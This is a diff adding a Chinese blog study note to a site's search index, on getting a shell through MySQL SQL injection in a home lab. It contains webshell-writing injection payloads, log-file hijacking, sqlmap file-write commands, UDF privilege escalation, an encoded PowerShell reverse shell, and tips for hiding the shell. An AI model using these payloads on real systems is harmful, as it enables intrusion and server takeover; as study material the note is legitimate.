@@ -2721,6 +2721,118 @@
   <entry>
     <title>利用sql注入getshell</title>
     <url>/2025/02/25/%E5%88%A9%E7%94%A8sql%E6%B3%A8%E5%85%A5getshell/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p>感觉自己实操还有欠缺，刚好看到别的师傅有这个主题的博客，我也顺着写一篇笔记</p>
+<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>直接用了之前上课用到的代码，很简单构造出一个有sql注入的环境</p>
+<p>mysql用的是<code>5.1.60</code></p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Get查询&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;margin-top: 70px;color: black;font-size: 23px;text-align: center&quot;</span>&gt;</span><br><span class="line">    &lt;font color=<span class="string">&quot;#FF0000&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;con_database.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from books where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;sql语句执行失败&#x27;</span>.<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color = &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&#x27;Book name:&#x27;</span>.<span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Author:&#x27;</span>.<span class="variable">$row</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;请输入要查询的记录id&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;/font&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>很明显漏洞在这里</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from books where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Into-outfile写入文件"><a href="#Into-outfile写入文件" class="headerlink" title="Into outfile写入文件"></a>Into outfile写入文件</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li>执行<code>INTO OUTFILE</code>操作的用户必须拥有<code>FILE</code>权限，也可以说是必须是root权限</li>
+<li>知道当前网站的绝对路径，对应的路径有写入权限</li>
+<li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li>
+<li>secure_file_priv 没有具体值</li>
+</ul>
+<blockquote>
+<p>secure_file_priv 的值为null ，表示限制 mysqld 不允许导入|导出<br>secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下<br>secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+</blockquote>
+<h5 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h5><p><strong>基于联合查询</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select &#x27;&lt;?php phpinfo(); ?&gt;&#x27;,NULL,NULL into outfile &#x27;C:/phpstudy_pro/WWW/1.php&#x27; --+ </span><br></pre></td></tr></table></figure>
+
+<p><strong>非联合查询</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; into outfile &#x27;C:/phpstudy_pro/WWW/4.php&#x27; FIELDS TERMINATED BY &#x27;&lt;?php phpinfo();?&gt;&#x27; --+ </span><br></pre></td></tr></table></figure>
+
+<p>空格可以用+号，<code>%0a</code>、<code>%0b</code>、<code>%a0</code> 、 &#x2F;**&#x2F; 注释符等代替</p>
+<p><strong>sqlmap</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.64.145/sql/sql2-2?id=1&#x27; --file-write=/Users/lingtian/downloads/info.php --file-dest=&quot;C:\phpstudy_pro\WWW\3.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Outfile和dumpfile的区别"><a href="#Outfile和dumpfile的区别" class="headerlink" title="Outfile和dumpfile的区别"></a>Outfile和dumpfile的区别</h5><p><strong>outfile</strong>:</p>
+<blockquote>
+<p>1、 支持多行数据同时导出</p>
+<p>2、 使用union联合查询时，要保证两侧查询的列数相同</p>
+<p>3、 会在换行符制表符后面追加反斜杠</p>
+<p>4、会在末尾追加换行</p>
+</blockquote>
+<p><strong>dumpfile</strong>:</p>
+<blockquote>
+<p>1、 每次只能导出一行数据</p>
+<p>2、 不会在换行符制表符后面追加反斜杠</p>
+<p>3、 不会在末尾追加换行</p>
+</blockquote>
+<p>所以我们可以用dumpfile写入二进制文件，而用outfile写入的二进制文件最终会无法生效（追加的反斜杠会使二进制文件无法生效）</p>
+<h4 id="利用日志写入webshell"><a href="#利用日志写入webshell" class="headerlink" title="利用日志写入webshell"></a>利用日志写入webshell</h4><ul>
+<li>web文件夹权限宽松，可以接受写入新的东西</li>
+<li>最好是windows系统</li>
+<li>运行Mysql或Apache的是高权限</li>
+</ul>
+<p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                           |</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                             |</span><br><span class="line">| general_log_file | C:\phpstudy_pro\Extensions\MySQL5.1.60\data\WINDOWS-M9UNPKC.log |</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数需要<code>general_log</code>是ON的状态，这样mysql才会记录每一条记录，第二个参数<code>general_log_file</code>是日志的文件路径</p>
+<p>如果要写入shell，两个参数都要修改，如果是注入，可以利用到堆叠注入</p>
+<p>用到一个源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)):</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br></pre></td></tr></table></figure>
+
+<p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p>
+<p>在windows用这个给文件夹权限设置宽松</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls &quot;C:\phpstudy_pro\WWW&quot;  /grant Everyone:(F) /T</span><br></pre></td></tr></table></figure>
+
+<p>Linux是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod -R 777 /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>如果遇到堆叠注入，payload可以这样写</p>
+<p>先修改两个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;;set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;C:\phpstudy_pro\WWW\shell.php&#x27;;--+</span><br></pre></td></tr></table></figure>
+
+<p>直接在数据库测试了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; set global general_log = &quot;ON&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SET GLOBAL general_log_file=&quot;C:\\phpstudy_pro\\WWW\\shell.php&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+-------------------------------+</span><br><span class="line">| Variable_name    | Value                         |</span><br><span class="line">+------------------+-------------------------------+</span><br><span class="line">| general_log      | ON                            |</span><br><span class="line">| general_log_file | C:\phpstudy_pro\WWW\shell.php |</span><br><span class="line">+------------------+-------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>然后尝试写入shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;; select &#x27;&lt;?php eval(@$_GET[&#x27;a&#x27;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>写入后，注意这里要闭合好，不然没办法正常执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\phpstudy_pro\www&gt; type .\shell.php</span><br><span class="line">C:\phpstudy_pro\COM\..\Extensions\MySQL5.1.60\\bin\mysqld.exe, Version: 5.1.60-community (MySQL Community Server (GPL)). started with:</span><br><span class="line">TCP Port: 3306, Named Pipe: MySQL</span><br><span class="line">Time                 Id Command    Argument</span><br><span class="line">250226  1:14:58   260 Query     select &#x27;&lt;?php eval(@$_GET[&#x27;a&#x27;]);?&gt;&#x27;</span><br><span class="line">                  260 Query     show warnings</span><br></pre></td></tr></table></figure>
+
+<p>尝试生存个powershell的payload也能成功反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shell.php?a=system(%27powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYANAAuADEAOAA3ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==%27);</span><br></pre></td></tr></table></figure>
+
+<h5 id="慢查询"><a href="#慢查询" class="headerlink" title="慢查询"></a>慢查询</h5><p>思路是差不多的，修改的参数不一样而已</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;		--查看慢查询信息</span><br><span class="line">set global slow_query_log=1;				--启用慢查询日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;	--修改日志文件路径</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(11);				--写shell</span><br></pre></td></tr></table></figure>
+
+<p>为什么要用慢查询，只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志，一般都是通过<code>long_query_time</code>选项来设置这个时间值，时间以秒为单位，可以精确到微秒。</p>
+<p>通常情况下执行<code>sql</code>语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不会引起管理员的察觉。拿到shell后上传一个新的shell，删掉原来shell，新shell做隐藏，这样shell可能还能活的时间长些</p>
+<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p>在MySQL&gt;&#x3D;5.1的版本，我们可以创建自定义函数的方式来执行恶意代码，添加的函数可以在select中使用，就像使用version()一样方便</p>
+<p>sqlmap和Metasploit都提供了动态链接库，直接用就行</p>
+<p>这次用的版本是<code>5.7.26</code></p>
+<h5 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">+---------------+---------------------------------------------------+</span><br><span class="line">| Variable_name | Value                                             |</span><br><span class="line">+---------------+---------------------------------------------------+</span><br><span class="line">| plugin_dir    | C:\phpstudy_pro\Extensions\MySQL5.7.26\lib/plugin |</span><br><span class="line">+---------------+---------------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<h5 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h5><p>secure_file_priv 要是<strong>空的！空的！空的！</strong></p>
+<p>如果有sql注入且是高权限，plugin目录可写，secure_file_priv 无限制，这个时候可以直接用sqlmap跑</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.64.145/sql/sql2-2?id=1&#x27; --file-write=/Users/lingtian/downloads/lib_mysqludf_sys_64.dll --file-dest=&#x27;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf1.dll&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如果没有注入，可以在secure_file_priv 无限制的情况下，手工写到插件目录下</p>
+<p>借鉴<a class="link"   href="https://www.sqlsec.com/tools/udf.html" >国光师傅的payload<i class="fas fa-external-link-alt"></i></a>，成功写入执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf1.dll&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">| name     | ret | dl       | type     |</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">| sys_eval |   0 | udf1.dll | function |</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_eval(&#x27;whoami&#x27;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| sys_eval(&#x27;whoami&#x27;)    |</span><br><span class="line">+-----------------------+</span><br><span class="line">| windows-m9unpkc\admin |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.53 sec)</span><br></pre></td></tr></table></figure>
+
+<p>如果不想要一大串十六进制的东西，可以先加载dll写到一个文件，在dumpfile写进去</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table foo (xxx blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(&#x27;C:\\Users\\admin\\Downloads\\lib_mysqludf_sys_32.dll&#x27;));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\111.dll&quot;;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">后面的加载函数同上</span><br></pre></td></tr></table></figure>
+
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link"   href="https://www.sqlsec.com/2020/11/mysql.html" >https://www.sqlsec.com/2020/11/mysql.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://drun1baby.top/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/" >https://drun1baby.top/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html" >https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h4><p>先大概写到这里，虽然不是很难，但是复现真的花了一些时间，有些小细节要注意，用户权限，文件夹宽松权限，secure_file_priv要是空的，这些都要注意！</p>
+]]></content>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
   </entry>
 </search>
